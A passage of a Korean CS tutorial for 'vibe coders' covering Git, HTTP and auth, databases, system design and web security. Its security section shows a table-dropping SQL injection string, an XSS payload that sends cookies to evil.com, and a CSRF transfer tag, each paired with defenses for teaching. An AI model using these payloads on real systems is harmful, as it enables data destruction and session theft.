# CS Fundamentals for Vibe Coders

## 학습 진도 체크리스트

각 항목을 이해하면 체크하라. "설명할 수 있다" 수준이 기준이다.

```
[ ] 0. Git — 커밋, 브랜치, 머지, 되돌리기를 자유롭게 할 수 있다
[ ] 1. 네트워크 — REST API를 설계하고, 인증 방식을 선택할 수 있다
[ ] 2. 데이터베이스 — 테이블 설계, 인덱스, 트랜잭션을 판단할 수 있다
[ ] 3. 시스템 설계 — 캐시, 큐, 확장 전략을 선택할 수 있다
[ ] 4. 보안 — AI 코드의 보안 취약점을 찾아낼 수 있다
[ ] 5. 동시성 — Race Condition과 데드락을 설명할 수 있다
[ ] 6. 인프라 — Docker로 앱을 패키징하고 CI/CD를 구성할 수 있다
[ ] 7. 테스트 — AI가 만든 코드에 테스트를 추가할 수 있다
```

> 난이도 표시: `[기초]` `[중급]` `[심화]`

---

# 0. Git `[기초]`

코드를 한 줄이라도 쓴다면 Git은 필수다. 바이브코딩이든 직접 코딩이든.

---

## 0.1 Git의 멘탈 모델

Git은 파일의 **스냅샷**을 시간순으로 저장하는 도구다.

### 3개 영역

```
Working Directory    →  Staging Area (Index)  →  Repository (.git)
  (작업 공간)              (다음 커밋 준비)          (확정된 히스토리)

  파일 수정           git add                  git commit
                     ────────→                ────────→

  git checkout/restore       git restore --staged
                     ←────────                ←────────
```

**왜 Staging이 있는가?**
10개 파일을 고쳤는데 그 중 3개만 커밋하고 싶을 때.
관련 있는 변경만 묶어서 의미 있는 커밋을 만들기 위해.

## 0.2 일상 명령어

```bash
# 시작
git init                          # 새 저장소 생성
git clone <url>                   # 기존 저장소 복제

# 변경 확인
git status                        # 현재 상태 (무엇이 변했는가)
git diff                          # 변경 내용 (무엇이 달라졌는가)
git log --oneline --graph         # 커밋 히스토리

# 커밋
git add <file>                    # 특정 파일 스테이징
git add -A                        # 모든 변경 스테이징
git commit -m "설명"               # 커밋

# 브랜치
git branch <name>                 # 브랜치 생성
git checkout <name>               # 브랜치 이동 (또는 git switch)
git checkout -b <name>            # 생성 + 이동 한 번에

# 합치기
git merge <branch>                # 현재 브랜치에 합치기
git rebase <branch>               # 현재 브랜치를 기준 위에 재배치

# 원격
git push origin <branch>          # 원격에 올리기
git pull origin <branch>          # 원격에서 받기 (fetch + merge)
```

## 0.3 브랜치 전략

```
main (production)
  └── develop
        ├── feature/login
        ├── feature/payment
        └── fix/signup-bug
```

- **main**: 항상 배포 가능한 상태
- **develop**: 다음 릴리스를 준비하는 통합 브랜치
- **feature/xxx**: 기능별 브랜치, 완료 후 develop에 머지
- **fix/xxx**: 버그 수정 브랜치

### merge vs rebase

```
merge: 히스토리를 있는 그대로 보존 (머지 커밋 생김)
  A---B---C (main)
       \       \
        D---E---F (merge commit)

rebase: 히스토리를 깔끔하게 직선으로 (커밋이 재배치됨)
  A---B---C---D'---E' (main)
```

**원칙**: 공유 브랜치(main)는 merge, 개인 브랜치는 rebase.

## 0.4 되돌리기

```bash
# 아직 커밋 안 한 변경 되돌리기
git restore <file>                # 파일을 마지막 커밋 상태로

# 스테이징 취소
git restore --staged <file>       # add 취소 (파일 변경은 유지)

# 마지막 커밋 수정 (아직 push 안 했을 때만!)
git commit --amend                # 메시지 수정 또는 파일 추가

# 커밋 되돌리기 (히스토리 보존 — 안전)
git revert <commit>               # 해당 커밋을 취소하는 새 커밋 생성

# 커밋 되돌리기 (히스토리 삭제 — 위험, push 전에만)
git reset --soft HEAD~1           # 커밋 취소, 변경은 staged 상태로
git reset --mixed HEAD~1          # 커밋 취소, 변경은 unstaged 상태로
git reset --hard HEAD~1           # 커밋 + 변경 전부 삭제 (복구 불가!)
```

## 0.5 .gitignore

```gitignore
# 환경/시크릿 — 절대 올리면 안 됨
.env
.env.*
*.pem

# 의존성 — 용량 크고, 설치하면 되니까
node_modules/
vendor/
venv/

# 빌드 결과물
dist/
build/
.next/

# OS/에디터
.DS_Store
*.swp
.idea/
.vscode/
```

## AI가 자주 틀리는 것

- [ ] `.env` 파일을 gitignore에 안 넣음
- [ ] `node_modules/`를 커밋하라고 안내
- [ ] 커밋 메시지를 "update" 같은 무의미한 이름으로 생성
- [ ] 한 커밋에 관련 없는 변경을 전부 몰아넣음

---

# 1. 네트워크와 HTTP `[기초]`

AI에게 "API 만들어줘"라고 할 때, 뭘 요구해야 하는지 알려면 이걸 알아야 한다.

---

## 1.1 인터넷은 어떻게 동작하는가

브라우저에 `google.com`을 치면 일어나는 일:

```
[브라우저] → DNS 조회 (google.com → 142.250.196.110)
         → TCP 3-way handshake (SYN → SYN-ACK → ACK)
         → TLS handshake (HTTPS일 경우)
         → HTTP 요청 전송
         → 서버가 HTML 응답
         → 브라우저가 렌더링
```

**DNS**: 도메인 이름을 IP 주소로 바꿔주는 전화번호부.
**TCP**: 데이터가 순서대로, 빠짐없이 도착하도록 보장하는 프로토콜.
**UDP**: 순서/도착 보장 안 하지만 빠름. 영상 스트리밍, 게임에 사용.

## 1.2 HTTP 기초

HTTP는 클라이언트와 서버가 대화하는 규칙이다.

### 요청(Request)의 구조

```http
POST /api/users HTTP/1.1        ← 메서드, 경로, 버전
Host: example.com               ← 헤더
Content-Type: application/json
Authorization: Bearer eyJhbG...

{                                ← 바디
  "name": "홍길동",
  "email": "hong@test.com"
}
```

### HTTP 메서드 — 언제 뭘 쓰는가

| 메서드 | 용도 | 멱등성 | 바디 |
|--------|------|--------|------|
| GET | 조회 | O | X |
| POST | 생성 | X | O |
| PUT | 전체 수정 | O | O |
| PATCH | 부분 수정 | X | O |
| DELETE | 삭제 | O | X |

**멱등성(Idempotent)**: 같은 요청을 여러 번 보내도 결과가 같은 성질.
- `DELETE /users/1`을 3번 보내면? → 첫 번째만 삭제, 나머지는 404. 결과는 동일.
- `POST /users`를 3번 보내면? → 유저가 3명 생긴다. 멱등하지 않다.

### 상태 코드 — 숫자가 의미하는 것

```
2xx 성공     200 OK, 201 Created, 204 No Content
3xx 리다이렉트  301 영구 이동, 302 임시 이동, 304 캐시 사용
4xx 클라이언트 잘못  400 Bad Request, 401 미인증, 403 권한없음, 404 없음, 429 요청 과다
5xx 서버 잘못  500 서버 에러, 502 게이트웨이 에러, 503 서비스 불가
```

**401 vs 403 차이**: 401은 "너 누구야?"(로그인 안 됨), 403은 "너인 건 아는데 안 돼"(권한 없음).

## 1.3 REST API 설계

REST는 URL로 자원을, HTTP 메서드로 행위를 표현하는 규칙이다.

### 좋은 API vs 나쁜 API

```
나쁜 예:
GET  /getUser?id=1
POST /deleteUser
POST /updateUserName

좋은 예:
GET    /users/1          ← 유저 1 조회
POST   /users            ← 유저 생성
PATCH  /users/1          ← 유저 1 수정
DELETE /users/1          ← 유저 1 삭제
GET    /users/1/posts    ← 유저 1의 게시글 목록
```

### 설계 원칙

- **URL은 명사, 메서드가 동사**: `/users` (O), `/getUsers` (X)
- **복수형 사용**: `/users` (O), `/user` (X)
- **중첩은 2단계까지**: `/users/1/posts` (O), `/users/1/posts/5/comments/3/likes` (X)
- **필터링은 쿼리 파라미터로**: `/users?role=admin&sort=created_at`
- **버저닝**: `/api/v1/users` 또는 헤더로 `Accept: application/vnd.api+json;version=1`

## 1.4 인증과 인가

**인증(Authentication)**: 너 누구야? (로그인)
**인가(Authorization)**: 너 이거 해도 돼? (권한 확인)

### 세션 기반 vs 토큰 기반

```
세션 방식:
[클라이언트] → 로그인 → [서버: 세션 저장] → Set-Cookie: sessionId=abc123
[클라이언트] → Cookie: sessionId=abc123 → [서버: 세션에서 유저 조회]

토큰 방식:
[클라이언트] → 로그인 → [서버: JWT 발급] → { token: "eyJhbG..." }
[클라이언트] → Authorization: Bearer eyJhbG... → [서버: 토큰 검증]
```

| | 세션 | JWT |
|---|------|-----|
| 저장 위치 | 서버 | 클라이언트 |
| 확장성 | 서버 간 세션 공유 필요 | 서버 확장 용이 |
| 무효화 | 세션 삭제하면 끝 | 만료 전까지 무효화 어려움 |
| 적합한 경우 | 전통적 웹앱 | SPA, 모바일, MSA |

### JWT의 구조

```
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjEsInJvbGUiOiJhZG1pbiJ9.서명값

[헤더].[페이로드].[서명]

헤더:    { "alg": "HS256" }
페이로드: { "userId": 1, "role": "admin", "exp": 1720000000 }
서명:    HMAC-SHA256(헤더 + "." + 페이로드, 비밀키)
```

**JWT 주의점**:
- 페이로드는 Base64 디코딩하면 누구나 볼 수 있다. **비밀번호 넣지 마라**.
- 토큰 탈취 시 만료까지 막을 수 없다. → **짧은 만료 + Refresh Token** 조합으로 해결.
- 토큰 크기가 크면 매 요청마다 오버헤드. 필요한 최소 정보만 담아라.

### OAuth 2.0 핵심 흐름 (소셜 로그인)

```
[사용자] → "구글로 로그인" 클릭
[우리 서버] → 구글 인증 페이지로 리다이렉트
[사용자] → 구글에서 로그인 + 동의
[구글] → 우리 서버에 authorization code 전달
[우리 서버] → code로 구글에 access token 요청
[구글] → access token 발급
[우리 서버] → access token으로 구글 API에서 유저 정보 조회
```

## 1.5 CORS

브라우저가 `localhost:3000`에서 `api.example.com`으로 요청하면 CORS 에러가 난다.

### 왜 존재하는가

보안 때문이다. 악성 사이트가 사용자의 브라우저를 통해 은행 API를 호출하는 것을 막는다.
**Same-Origin Policy**: 프로토콜 + 호스트 + 포트가 모두 같아야 같은 출처.

```
http://localhost:3000  →  http://localhost:8080   ← 포트 다름, CORS
http://example.com     →  https://example.com     ← 프로토콜 다름, CORS
https://a.example.com  →  https://b.example.com   ← 호스트 다름, CORS
```

### 해결 방법

서버에서 응답 헤더에 허용할 출처를 명시한다:

```
Access-Control-Allow-Origin: https://myapp.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
```

**`Access-Control-Allow-Origin: *`은 개발 중에만 써라.** 프로덕션에서는 특정 도메인만 허용.

## 1.6 캐싱

같은 데이터를 반복해서 요청하지 않게 저장해두는 전략.

### 브라우저 캐시 헤더

```http
Cache-Control: max-age=3600        ← 1시간 동안 캐시 사용
Cache-Control: no-cache            ← 매번 서버에 확인 (304 가능)
Cache-Control: no-store            ← 아예 캐시 안 함 (민감 데이터)
ETag: "abc123"                     ← 내용이 바뀌었는지 비교용 해시
```

### 캐시 계층

```
[브라우저 캐시] → [CDN] → [서버 앞단 캐시(Redis)] → [서버] → [DB]
   가장 빠름                                              가장 느림
```

## AI가 자주 틀리는 것

- [ ] GET 요청에 body를 넣는 코드를 생성함
- [ ] 모든 API를 POST로 만듦
- [ ] JWT를 localStorage에 저장하라고 함 (XSS 취약)
- [ ] CORS를 `*`로 열어두라고 함
- [ ] 에러 응답에 적절한 상태 코드 대신 항상 200을 반환
- [ ] API 버저닝 없이 설계

---

# 2. 데이터베이스 `[기초~중급]`

AI가 만든 쿼리가 왜 느린지, 테이블 설계가 왜 꼬였는지 판단하려면 이걸 알아야 한다.

---

## 2.1 관계형 DB 기초

데이터를 **테이블(표)** 형태로 저장하고, 테이블 간의 **관계**로 연결하는 방식.

### 핵심 개념

```sql
-- 테이블 = 엑셀 시트
-- 로우(Row) = 한 줄의 데이터
-- 컬럼(Column) = 항목/필드

CREATE TABLE users (
    id         BIGINT PRIMARY KEY AUTO_INCREMENT,  -- 기본키: 각 행을 유일하게 식별
    email      VARCHAR(255) UNIQUE NOT NULL,       -- 유니크: 중복 불가
    name       VARCHAR(100) NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE posts (
    id         BIGINT PRIMARY KEY AUTO_INCREMENT,
    user_id    BIGINT NOT NULL,                    -- 외래키: users 테이블 참조
    title      VARCHAR(200) NOT NULL,
    content    TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id)
);
```

**기본키(PK)**: 행을 유일하게 식별. 테이블당 1개.
**외래키(FK)**: 다른 테이블의 PK를 참조. 관계를 표현.

### 관계의 종류

```
1:1  — 유저 ↔ 유저 프로필 (한 유저에 하나의 프로필)
1:N  — 유저 ↔ 게시글 (한 유저가 여러 게시글)
N:M  — 게시글 ↔ 태그 (한 게시글에 여러 태그, 한 태그에 여러 게시글)
      → 중간 테이블(post_tags)로 해결
```

## 2.2 정규화

데이터 중복을 줄이고 무결성을 보장하기 위해 테이블을 분리하는 과정.

### 비정규화 상태 (문제가 되는 테이블)

```
주문 테이블:
| 주문ID | 고객명 | 고객전화 | 상품명  | 상품가격 |
|--------|--------|----------|---------|---------|
| 1      | 김철수 | 010-1234 | 키보드  | 50000   |
| 2      | 김철수 | 010-1234 | 마우스  | 30000   |   ← 김철수 정보 중복
| 3      | 이영희 | 010-5678 | 키보드  | 50000   |   ← 키보드 가격 중복
```

**문제**: 김철수 전화번호가 바뀌면? → 2개 행을 다 고쳐야 함 (갱신 이상).

### 정규화 후

```sql
-- 고객 테이블
| 고객ID | 고객명 | 고객전화  |
|--------|--------|----------|
| 1      | 김철수 | 010-1234 |
| 2      | 이영희 | 010-5678 |

-- 상품 테이블
| 상품ID | 상품명 | 상품가격 |
|--------|--------|---------|
| 1      | 키보드 | 50000   |
| 2      | 마우스 | 30000   |

-- 주문 테이블
| 주문ID | 고객ID | 상품ID |
|--------|--------|--------|
| 1      | 1      | 1      |
| 2      | 1      | 2      |
| 3      | 2      | 1      |
```

### 정규화 단계 (간단히)

- **1NF**: 한 칸에 하나의 값만 (쉼표로 구분된 목록 X)
- **2NF**: PK의 일부에만 의존하는 컬럼 분리
- **3NF**: PK가 아닌 컬럼에 의존하는 컬럼 분리

**비정규화할 때**: 읽기 성능이 극도로 중요하고, 데이터 일관성을 코드로 관리할 수 있을 때. 조회가 99%인 경우 일부러 중복을 허용하기도 한다.

## 2.3 SQL 핵심

### 조회 — SELECT

```sql
-- 기본 조회
SELECT name, email FROM users WHERE id = 1;

-- 정렬과 페이지네이션
SELECT * FROM posts ORDER BY created_at DESC LIMIT 20 OFFSET 40;  -- 3페이지

-- 집계 함수
SELECT user_id, COUNT(*) as post_count
FROM posts
GROUP BY user_id
HAVING COUNT(*) >= 5;  -- 게시글 5개 이상인 유저만
```

### JOIN — 테이블 연결

```sql
-- INNER JOIN: 양쪽 다 있는 것만
SELECT u.name, p.title
FROM users u
INNER JOIN posts p ON u.id = p.user_id;

-- LEFT JOIN: 왼쪽 전부 + 오른쪽은 있으면
SELECT u.name, p.title
FROM users u
LEFT JOIN posts p ON u.id = p.user_id;
-- → 게시글 없는 유저도 나옴 (p.title = NULL)
```

```
INNER JOIN:  A ∩ B (교집합)
LEFT JOIN:   A 전부 + B 매칭되는 것
RIGHT JOIN:  B 전부 + A 매칭되는 것
FULL JOIN:   A ∪ B (합집합)
```

### 서브쿼리 vs JOIN

```sql
-- 서브쿼리 (느릴 수 있음)
SELECT * FROM users
WHERE id IN (SELECT user_id FROM posts WHERE created_at > '2024-01-01');

-- JOIN으로 동일하게 (보통 더 빠름)
SELECT DISTINCT u.* FROM users u
INNER JOIN posts p ON u.id = p.user_id
WHERE p.created_at > '2024-01-01';
```

## 2.4 인덱스

책의 목차와 같다. 없으면 전체를 다 뒤져야 하고(Full Table Scan), 있으면 바로 찾는다.

### B-Tree 인덱스 원리 (간략)

```
인덱스 없이 "email = 'hong@test.com'" 검색:
→ 100만 행을 처음부터 끝까지 스캔 = O(N)

인덱스 있으면:
→ B-Tree에서 이진 탐색 = O(log N) ≈ 20번 비교로 끝
```

### 인덱스를 걸어야 하는 곳

```sql
-- WHERE절에 자주 쓰이는 컬럼
CREATE INDEX idx_users_email ON users(email);

-- JOIN 조건 컬럼
CREATE INDEX idx_posts_user_id ON posts(user_id);

-- ORDER BY 컬럼
CREATE INDEX idx_posts_created_at ON posts(created_at);

-- 복합 인덱스 (순서 중요!)
CREATE INDEX idx_posts_user_date ON posts(user_id, created_at);
-- → WHERE user_id = 1 ORDER BY created_at 에 최적
```

### 인덱스를 걸면 안 되는 곳

- **변경이 매우 잦은 컬럼**: INSERT/UPDATE마다 인덱스도 갱신 → 쓰기 성능 저하
- **카디널리티가 낮은 컬럼**: `gender` (M/F 2종류) → 인덱스 효과 거의 없음
- **거의 조회하지 않는 컬럼**: 쓸데없이 공간만 차지

### 실행 계획 보기

```sql
EXPLAIN SELECT * FROM users WHERE email = 'hong@test.com';

-- 확인 포인트:
-- type: ALL(풀스캔, 나쁨) → range → ref → const(최고)
-- rows: 예상 검색 행 수 (적을수록 좋음)
-- Extra: Using index(인덱스만으로 해결, 최고)
```

## 2.5 트랜잭션과 ACID

### 트랜잭션이란

여러 작업을 하나로 묶어, 전부 성공하거나 전부 실패하게 만드는 것.

```sql
-- 계좌 이체: A에서 B로 10만원
BEGIN TRANSACTION;
  UPDATE accounts SET balance = balance - 100000 WHERE id = 'A';
  UPDATE accounts SET balance = balance + 100000 WHERE id = 'B';
COMMIT;   -- 둘 다 성공하면 확정

-- 중간에 에러나면?
ROLLBACK; -- 둘 다 취소 (A에서 돈만 빠지는 사태 방지)
```

### ACID

- **Atomicity (원자성)**: 전부 되거나, 전부 안 되거나
- **Consistency (일관성)**: 트랜잭션 전후로 DB 규칙이 유지됨
- **Isolation (격리성)**: 동시 트랜잭션이 서로 간섭하지 않음
- **Durability (지속성)**: 커밋된 데이터는 시스템 장애에도 보존됨

### 격리 수준

```
Read Uncommitted → 다른 트랜잭션의 미완 데이터도 보임 (Dirty Read)
Read Committed   → 커밋된 것만 보임 (대부분의 DB 기본값)
Repeatable Read  → 트랜잭션 중 읽은 데이터가 변하지 않음 (MySQL 기본값)
Serializable     → 완전 직렬 실행. 가장 안전하지만 가장 느림
```

## 2.6 NoSQL

관계형 DB만이 답은 아니다. 용도에 맞는 도구가 따로 있다.

| 유형 | 대표 | 적합한 경우 |
|------|------|------------|
| Document DB | MongoDB | 스키마가 자주 변하는 데이터, 비정형 데이터 |
| Key-Value | Redis | 캐시, 세션, 랭킹, 실시간 데이터 |
| Wide-Column | Cassandra | 대용량 쓰기, 시계열 데이터 |
| Graph DB | Neo4j | 소셜 네트워크, 추천 시스템 |

### RDB vs NoSQL 선택 기준

- 데이터 간 관계가 복잡하고, 일관성이 중요한가? → **RDB**
- 스키마가 유동적이고, 수평 확장이 중요한가? → **NoSQL**
- 대부분의 경우 → **RDB로 시작하고, 필요할 때 NoSQL 추가**

## 2.7 ORM의 함정

ORM(Sequelize, Prisma, TypeORM 등)은 편하지만, 모르고 쓰면 성능 폭탄이 된다.

### N+1 문제

```javascript
// 유저 10명의 게시글을 조회하는 코드 (Prisma 예시)
const users = await prisma.user.findMany();  // 쿼리 1번
for (const user of users) {
    const posts = await prisma.post.findMany({  // 쿼리 10번!
        where: { userId: user.id }
    });
}
// 총 11번의 쿼리 = N+1 문제

// 해결: include로 한 번에 가져오기
const users = await prisma.user.findMany({
    include: { posts: true }  // 쿼리 2번 (유저 + 게시글)
});
```

### AI가 만든 ORM 코드 체크리스트

- [ ] 반복문 안에서 DB 호출하고 있지 않은가? (N+1)
- [ ] 필요 없는 컬럼까지 `SELECT *`로 가져오지 않는가?
- [ ] 대량 데이터에 `findAll()` 같은 전체 조회를 쓰지 않는가?
- [ ] 페이지네이션 없이 목록을 반환하지 않는가?

## AI가 자주 틀리는 것

- [ ] 인덱스 없이 테이블 설계
- [ ] N+1 문제가 있는 ORM 코드 생성
- [ ] 트랜잭션 없이 여러 테이블을 동시에 수정
- [ ] OFFSET 기반 페이지네이션만 사용 (대용량에서 느림 → cursor 기반 추천)
- [ ] 비밀번호를 평문으로 저장하는 스키마 생성
- [ ] 적절한 제약조건(UNIQUE, NOT NULL, FK) 없이 테이블 생성

---

# 3. 시스템 설계 `[중급]`

AI한테 부분을 맡기려면, 전체 구조를 먼저 그릴 수 있어야 한다.

---

## 3.1 클라이언트-서버 아키텍처

### 기본 구조

```
[프론트엔드]  ←HTTP→  [백엔드]  ←SQL→  [DB]
(React/Next)         (Node/Spring)    (MySQL/PostgreSQL)
```

### 모놀리스 vs MSA

**모놀리스**: 하나의 프로젝트에 모든 기능이 있음.
```
my-app/
├── auth/
├── users/
├── posts/
├── payments/
└── notifications/
→ 하나의 서버, 하나의 DB, 하나의 배포 단위
```

**MSA (Microservices Architecture)**: 기능별로 독립된 서비스.
```
auth-service/        → 인증 전담, 자체 DB
user-service/        → 유저 관리 전담, 자체 DB
post-service/        → 게시글 전담, 자체 DB
payment-service/     → 결제 전담, 자체 DB
→ 각각 독립 배포, 독립 확장
```

| | 모놀리스 | MSA |
|---|---------|-----|
| 복잡도 | 낮음 | 높음 |
| 배포 | 한 번에 전체 | 서비스별 독립 |
| 확장 | 전체를 확장 | 필요한 서비스만 확장 |
| 장애 영향 | 하나 터지면 전체 장애 | 해당 서비스만 장애 |
| 적합한 시기 | 초기, 팀 5명 이하 | 서비스 성장 후, 팀 분리 후 |

**결론**: 무조건 MSA가 좋은 게 아니다. **모놀리스로 시작하고, 필요할 때 분리하라.**

### API Gateway

MSA에서 클라이언트가 각 서비스를 직접 호출하면 혼란. 앞에 게이트웨이를 둔다.

```
[클라이언트] → [API Gateway] → /auth/*  → auth-service
                             → /users/* → user-service
                             → /posts/* → post-service
```

역할: 라우팅, 인증, 속도 제한(Rate Limiting), 로깅

## 3.2 확장성

### 수직 확장 vs 수평 확장

```
수직 확장 (Scale Up):
  서버 1대의 사양을 올림 (CPU, RAM 증설)
  → 간단하지만 한계가 있음

수평 확장 (Scale Out):
  같은 서버를 여러 대로 늘림
  → 이론상 무한 확장 가능, 대신 설계가 복잡
```

### Stateless 설계의 중요성

서버에 상태를 저장하면 수평 확장이 불가능하다.

```
Stateful (나쁜 예):
  서버A에 로그인 → 세션이 서버A 메모리에 저장
  다음 요청이 서버B로 가면 → "누구세요?" 에러

Stateless (좋은 예):
  JWT 토큰으로 인증 → 어떤 서버가 받아도 검증 가능
  세션이 필요하면 → Redis에 중앙 저장
```

### 로드밸런서

여러 서버에 요청을 분산하는 장치.

```
[클라이언트] → [로드밸런서] → 서버1 (25%)
                           → 서버2 (25%)
                           → 서버3 (25%)
                           → 서버4 (25%)
```

분배 방식:
- **Round Robin**: 순서대로 돌아가며
- **Least Connections**: 현재 연결이 가장 적은 서버에
- **IP Hash**: 같은 IP는 같은 서버로 (세션 유지 필요 시)

## 3.3 캐시 전략

DB 조회는 비싸다. 자주 쓰는 데이터를 메모리에 미리 저장해두는 것.

### Cache-Aside 패턴 (가장 많이 씀)

```
요청 → 캐시 확인 → 있으면(Hit) → 바로 반환
                 → 없으면(Miss) → DB 조회 → 캐시에 저장 → 반환
```

```javascript
async function getUser(id) {
    // 1. 캐시 확인
    const cached = await redis.get(`user:${id}`);
    if (cached) return JSON.parse(cached);

    // 2. 캐시 없으면 DB 조회
    const user = await db.users.findById(id);

    // 3. 캐시에 저장 (TTL 1시간)
    await redis.set(`user:${id}`, JSON.stringify(user), 'EX', 3600);

    return user;
}
```

### 캐시 무효화 — "컴퓨터 과학에서 가장 어려운 문제 2가지: 캐시 무효화, 네이밍"

```
데이터가 바뀌면 캐시를 어떻게 처리할 것인가?

1. 즉시 삭제: 데이터 수정 시 캐시 삭제 → 다음 조회 때 DB에서 다시 읽음
2. TTL(Time To Live): 일정 시간 후 자동 만료 → 약간의 불일치 허용
3. Write-Through: 데이터 수정 시 캐시도 동시에 갱신
```

### 무엇을 캐시하면 좋은가

- 자주 읽히지만 잘 안 바뀌는 것: 유저 프로필, 설정, 카테고리 목록
- 계산 비용이 큰 것: 랭킹, 통계, 추천 결과
- 외부 API 응답: 환율, 날씨 데이터

## 3.4 메시지 큐

모든 작업을 즉시 처리할 필요는 없다. 오래 걸리는 작업은 큐에 넣고 나중에 처리.

```
동기 처리 (문제 상황):
  회원가입 → 유저 생성 → 이메일 발송 (3초) → 슬랙 알림 (1초) → 응답
  = 총 4초+ 대기

비동기 처리 (메시지 큐):
  회원가입 → 유저 생성 → 큐에 "이메일 보내" 이벤트 → 즉시 응답 (0.1초)
  [워커] → 큐에서 꺼내서 이메일 발송, 슬랙 알림
```

### 주요 메시지 큐

| 이름 | 특징 | 적합한 경우 |
|------|------|------------|
| Redis Queue | 간단, 가벼움 | 소규모, 간단한 작업 큐 |
| RabbitMQ | 복잡한 라우팅 가능 | 작업 분배, 우선순위 처리 |
| Kafka | 대용량, 이벤트 스트리밍 | 로그 수집, 실시간 데이터 파이프라인 |
| AWS SQS | 관리형, 서버리스 | AWS 환경, 운영 부담 최소화 |

## 3.5 자주 나오는 설계 패턴

### Rate Limiting

API 남용을 막기 위해 요청 횟수를 제한.

```
예: IP당 1분에 100회까지
→ 101번째 요청 → 429 Too Many Requests

구현 방식:
- Fixed Window: 1분 단위로 카운트 리셋
- Sliding Window: 최근 1분간의 요청 수를 계산
- Token Bucket: 일정 속도로 토큰이 생기고, 요청 시 토큰 소모
```

### Circuit Breaker

외부 서비스가 죽었을 때 계속 요청을 보내면 우리 서비스도 같이 죽는다.

```
[CLOSED] → 정상적으로 요청 전달
  ↓ (실패가 임계치 초과)
[OPEN] → 요청을 바로 실패시킴 (빠른 실패, 서비스 보호)
  ↓ (일정 시간 후)
[HALF-OPEN] → 일부 요청만 시도 → 성공하면 CLOSED로 복귀
```

## AI가 자주 틀리는 것

- [ ] 모든 프로젝트에 MSA를 적용하려 함
- [ ] 캐시 무효화 전략 없이 캐시만 추가
- [ ] 메시지 큐 없이 이메일/알림을 API 핸들러에서 동기 처리
- [ ] 로드밸런싱 환경을 고려하지 않은 세션 기반 인증 설계
- [ ] Rate Limiting 없이 공개 API 설계

---

# 4. 보안 `[기초~중급]`

AI가 생성한 코드는 **매우 자신 있게 보안 취약 코드를 만든다**. 이게 가장 위험하다.

---

## 4.1 OWASP Top 10 핵심

### SQL Injection

```javascript
// 위험한 코드 (AI가 자주 만드는 패턴)
const query = `SELECT * FROM users WHERE email = '${email}'`;

// 공격: email에 "'; DROP TABLE users; --" 입력
// 실행되는 쿼리:
// SELECT * FROM users WHERE email = ''; DROP TABLE users; --'
// → 테이블이 삭제됨

// 안전한 코드 (Parameterized Query)
const query = `SELECT * FROM users WHERE email = ?`;
db.execute(query, [email]);  // email이 값으로만 처리됨, SQL로 해석 안 됨
```

### XSS (Cross-Site Scripting)

사용자 입력이 HTML로 렌더링될 때 발생.

```javascript
// 위험: 유저가 입력한 값을 그대로 HTML에 삽입
element.innerHTML = `<h1>${userInput}</h1>`;

// 공격: userInput = "<script>fetch('https://evil.com?cookie='+document.cookie)</script>"
// → 다른 사용자의 쿠키(세션)가 해커 서버로 전송됨

// 방어:
// 1. React 등 프레임워크 사용 (자동 이스케이프)
// 2. dangerouslySetInnerHTML 절대 쓰지 않기
// 3. 서버 응답에 Content-Security-Policy 헤더 설정
```

### CSRF (Cross-Site Request Forgery)

로그인된 사용자의 브라우저를 이용해 의도하지 않은 요청을 보내는 공격.

```html
<!-- 해커가 만든 페이지 -->
<img src="https://bank.com/transfer?to=hacker&amount=1000000" />
<!-- 피해자가 이 페이지를 열면, 은행 쿠키가 자동으로 붙어서 요청됨 -->

방어:
1. CSRF Token: 폼에 서버가 발급한 일회용 토큰 포함
2. SameSite Cookie: Set-Cookie: sessionId=abc; SameSite=Strict
3. 중요한 작업은 GET이 아닌 POST/PUT/DELETE로
```

## 4.2 입력 검증

**절대 원칙: 클라이언트 검증은 UX용, 서버 검증이 보안이다.**

```javascript
// 클라이언트 검증은 개발자도구에서 우회 가능
// 서버에서 반드시 다시 검증해야 함

// 나쁜 예: 클라이언트 검증만 의존
if (age >= 0 && age <= 150) {  // 브라우저에서만 체크
    fetch('/api/users', { body: { age } });
}

// 좋은 예: 서버에서도 검증
app.post('/api/users', (req, res) => {
    const { age } = req.body;
    if (typeof age !== 'number' || age < 0 || age > 150) {
        return res.status(400).json({ error: 'Invalid age' });
    }
    // 처리
});
```

### Validation vs Sanitization

```
Validation: "이 값이 올바른가?"
  - 이메일 형식인가? 숫자 범위 안인가?
  - 틀리면 거부

Sanitization: "이 값을 안전하게 바꾸자"
  - HTML 태그 제거: "<script>alert(1)</script>" → "alert(1)"
  - 공백 제거, 소문자 변환 등
```

## 4.3 인증/인가 보안

### 비밀번호 저장

```javascript
// 절대 하면 안 되는 것
password: "mypassword123"           // 평문 저장
password: md5("mypassword123")      // MD5 (취약, 레인보우 테이블 공격)
password: sha256("mypassword123")   // SHA256도 솔트 없으면 취약

// 올바른 방법: bcrypt (자동으로 솔트 포함, 의도적으로 느림)
const bcrypt = require('bcrypt');
const hash = await bcrypt.hash("mypassword123", 12);  // 12 = cost factor
// → "$2b$12$LJ3m4ys3Lk0sX9fOmRkHpOoFcOvKbR3e..." (매번 다른 해시)

const isMatch = await bcrypt.compare("mypassword123", hash);  // 검증
```

**왜 bcrypt인가?**
- 솔트(Salt)가 자동 포함 → 같은 비밀번호도 다른 해시값
- 의도적으로 느림 → 브루트포스 공격에 시간이 오래 걸림
- cost factor로 속도 조절 가능

### JWT 보안 체크리스트

```
- [ ] 비밀키가 코드에 하드코딩되어 있지 않은가?
- [ ] 토큰 만료 시간(exp)이 설정되어 있는가? (보통 15분~1시간)
- [ ] Refresh Token은 httpOnly 쿠키에 저장하는가?
- [ ] 알고리즘을 명시적으로 지정하는가? (alg: "none" 공격 방지)
- [ ] 민감한 정보(비밀번호, 주민번호)가 페이로드에 없는가?
```

### RBAC (Role-Based Access Control)

```javascript
// 역할 기반 접근 제어
const permissions = {
    admin:  ['read', 'write', 'delete', 'manage_users'],
    editor: ['read', 'write'],
    viewer: ['read']
};

function authorize(requiredPermission) {
    return (req, res, next) => {
        const userRole = req.user.role;
        if (!permissions[userRole]?.includes(requiredPermission)) {
            return res.status(403).json({ error: 'Forbidden' });
        }
        next();
    };
}

app.delete('/api/posts/:id', authorize('delete'), deletePost);
```

## 4.4 환경 변수와 시크릿 관리

```bash
